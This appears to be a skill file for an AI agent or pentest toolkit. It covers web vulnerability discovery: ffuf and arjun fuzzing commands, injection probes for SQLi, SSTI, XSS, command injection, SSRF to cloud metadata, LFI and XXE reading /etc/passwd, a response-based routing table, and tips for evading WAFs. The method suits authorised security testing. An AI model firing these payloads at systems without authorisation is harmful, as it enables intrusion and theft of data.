---
name: web-vuln-discovery
description: "Identify injection points and triage web vulnerabilities via fuzzing and response analysis"
category: web
tools: [ffuf, arjun, burpsuite, wfuzz, paramspider]
opsec: low
references:
  - source: public-security-references
    path: src/pentesting-web/web-vulnerabilities-methodology.md
  - source: public-security-references
    path: src/pentesting-web/timing-attacks.md
  - source: public-security-references
    path: src/pentesting-web/parameter-pollution.md
  - source: public-security-references
    path: Hidden Parameters/README.md
  - source: public-security-references
    path: SQL Injection/README.md
  - source: public-security-references
    path: Server Side Template Injection/README.md
---

# Web Vulnerability Discovery

<skill-name>web-vuln-discovery</skill-name>

Entry-point skill for web application testing. Discovers content, finds parameters, tests for injection points, and routes to the correct exploitation skill based on observed responses.

## Prerequisites

- Target URL or scope defined
- Proxy configured (Burp Suite or similar)
- Wordlists available (SecLists recommended: `apt install seclists` or `/usr/share/seclists/`)
- Tools: `ffuf`, `arjun` (pip install arjun), `paramspider` (pip install paramspider)

## Phase 1: Content Discovery

Find hidden endpoints, directories, and files.

```bash
# Directory and file discovery with ffuf
# -mc all: match all status codes, -fc 404: filter 404s
# -c: colorize, -w: wordlist
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# File discovery with common extensions
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# Technology-specific files
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://TARGET/FUZZ -e .php,.asp,.aspx,.jsp,.json,.xml,.yaml,.yml,.bak,.old,.swp,.git -mc all -fc 404

# API endpoint discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://TARGET/api/FUZZ -mc all -fc 404

# Virtual host / subdomain discovery
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://TARGET -H "Host: FUZZ.TARGET" -mc all -fs <default-response-size>
```

## Phase 2: Parameter Discovery

Find hidden or undocumented parameters on discovered endpoints.

```bash
# Arjun — automated parameter discovery
# Tests GET, POST, JSON, and XML parameter injection
arjun -u https://TARGET/endpoint

# Force specific methods
arjun -u https://TARGET/endpoint -m GET POST JSON

# With custom headers (e.g., auth token)
arjun -u https://TARGET/endpoint -m GET --headers "Authorization: Bearer TOKEN"

# ParamSpider — mine parameters from web archives
paramspider -d TARGET

# ffuf parameter fuzzing — brute-force GET params
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://TARGET/endpoint?FUZZ=test" -mc all -fs <baseline-size>

# ffuf parameter value fuzzing — test a known param with different values
ffuf -c -w /usr/share/seclists/Fuzzing/special-chars.txt \
  -u "https://TARGET/endpoint?param=FUZZ" -mc all -fs <baseline-size>
```

## Phase 3: Injection Point Testing

Test discovered parameters with polyglot and type-specific probes. Inject each payload into every discovered parameter and observe responses.

### Quick Polyglot Probes

These test strings trigger detectable behavior across multiple vulnerability classes:

```
'"><{{7*7}}${7*7}%{{7*7}}
```

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//
```

```
' OR '1'='1' --
```

```
{{7*7}}${7*7}<%= 7*7 %>
```

### Per-Class Test Payloads

**SQL Injection** — inject into each parameter:
```
'
"
')
")
;
' OR '1'='1
1 AND 1=2
1 AND 1=1
1' ORDER BY 1--+
```

**SSTI** — inject into each parameter:
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{constructor.constructor('return 1')()}}
```

**XSS** — inject into reflected parameters:
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
'-alert(1)-'
javascript:alert(1)
```

**Command Injection** — inject into parameters that interact with the OS:
```
; id
| id
`id`
$(id)
; sleep 5
| sleep 5
```

**SSRF** — inject into URL-type parameters:
```
http://127.0.0.1
http://[::1]
http://0.0.0.0
http://169.254.169.254/latest/meta-data/
http://COLLABORATOR.burpcollaborator.net
```

**LFI** — inject into file/path parameters:
```
../../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
/proc/self/environ
```

**XXE** — inject into XML input fields or Content-Type: application/xml:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Phase 4: Response Analysis & Decision Tree

Analyze responses from Phase 3 to identify vulnerability type, then follow the routing.

### SQL Injection

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| DB error: `You have an error in your SQL syntax` | MySQL SQLi | Identify technique below |
| DB error: `ERROR: unterminated quoted string` | PostgreSQL SQLi | Identify technique below |
| DB error: `Unclosed quotation mark` | MSSQL SQLi | Identify technique below |
| DB error: `ORA-00933: SQL command not properly ended` | Oracle SQLi | Identify technique below |
| Different page content for `1=1` vs `1=2` | Boolean-based blind | **sql-injection-blind** |
| Measurable delay with `SLEEP(5)` / `WAITFOR DELAY` / `pg_sleep(5)` | Time-based blind | **sql-injection-blind** |
| DB data visible in error message | Error-based extraction | **sql-injection-error** |
| `ORDER BY N` changes response, `UNION SELECT` returns data | Union-based | **sql-injection-union** |

**DBMS Fingerprinting** — once SQLi is confirmed, identify the backend:

| Payload (inject as tautology) | If True → DB Engine |
|---|---|
| `conv('a',16,2)=conv('a',16,2)` | MySQL |
| `@@CONNECTIONS=@@CONNECTIONS` | MSSQL |
| `5::int=5` | PostgreSQL |
| `ROWNUM=ROWNUM` | Oracle |
| `sqlite_version()=sqlite_version()` | SQLite |

### Server-Side Template Injection

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| `49` appears after injecting `{{7*7}}` | Jinja2 or Twig SSTI | **ssti-jinja2** or **ssti-twig** |
| `49` appears after injecting `${7*7}` | Freemarker or Java EL SSTI | **ssti-freemarker** |
| `49` appears after injecting `<%= 7*7 %>` | ERB (Ruby) SSTI | **ssti-erb** |
| Template engine error with syntax details | Error-based SSTI | Identify engine from error |

**Engine disambiguation** — if `{{7*7}}` returns `49`:

| Follow-Up Payload | Result | Engine |
|---|---|---|
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |

### XSS

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| Payload reflected verbatim in HTML response | Reflected XSS | **xss-reflected** |
| Payload persists and renders on subsequent page loads | Stored XSS | **xss-stored** |
| Payload appears in DOM via JavaScript (not in HTTP response) | DOM XSS | **xss-dom** |
| Payload partially filtered (some chars stripped) | Filter bypass needed | **xss-reflected** (filter bypass section) |

### SSRF

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| Response contains localhost content or internal service data | Direct SSRF | **ssrf** |
| Callback received at collaborator/webhook but no response data | Blind SSRF | **ssrf** |
| Cloud metadata returned (169.254.169.254) | SSRF to cloud metadata | **ssrf** (cloud section) |

### Command Injection

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| Command output (`uid=`, hostname, etc.) in response | Direct command injection | **command-injection** |
| Delay observed with `sleep 5` but no output | Blind command injection | **command-injection** (blind section) |
| Callback received at collaborator | OOB command injection | **command-injection** (OOB section) |

### LFI / File Inclusion

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| File contents (`root:x:0:0:`) in response | Local file inclusion | **lfi** |
| Base64 string returned (php://filter) | LFI via PHP wrappers | **lfi** (PHP wrappers section) |
| Remote file loaded and executed | Remote file inclusion | **lfi** (RFI section) |

### XXE

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| File contents in XML response | Classic XXE | **xxe** |
| Callback at collaborator from XML parsing | Blind/OOB XXE | **xxe** (blind section) |
| Error message containing file contents | Error-based XXE | **xxe** (error section) |

### File Upload

| Response Pattern | Indicates | Next Skill |
|---|---|---|
| Uploaded file accessible and executed server-side | File upload bypass | **file-upload-bypass** |
| Extension blocked but alternative accepted (.pHp, .php5, .phtml) | Extension filter bypass | **file-upload-bypass** |

## Troubleshooting

### WAF Blocking Requests

```bash
# Use ffuf's rate limiting to avoid triggering WAF
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -rate 50

# Rotate User-Agents
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Use -ac (auto-calibrate) to filter noise
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -ac
```

### Too Many False Positives

```bash
# Baseline the normal response size first
curl -s https://TARGET/nonexistent-page | wc -c

# Filter responses matching the baseline size (-fs)
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -fs <baseline-size>

# Or filter by word count (-fw) or line count (-fl)
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -fw <baseline-words>
```

### Parameter Discovery Returns Nothing

- Try POST method: `arjun -u URL -m POST`
- Try JSON body: `arjun -u URL -m JSON`
- Check for parameters in JavaScript files (use LinkFinder, JSParser)
- Mine Wayback Machine: `paramspider -d TARGET`
- Check Burp Suite history for parameters seen in-session
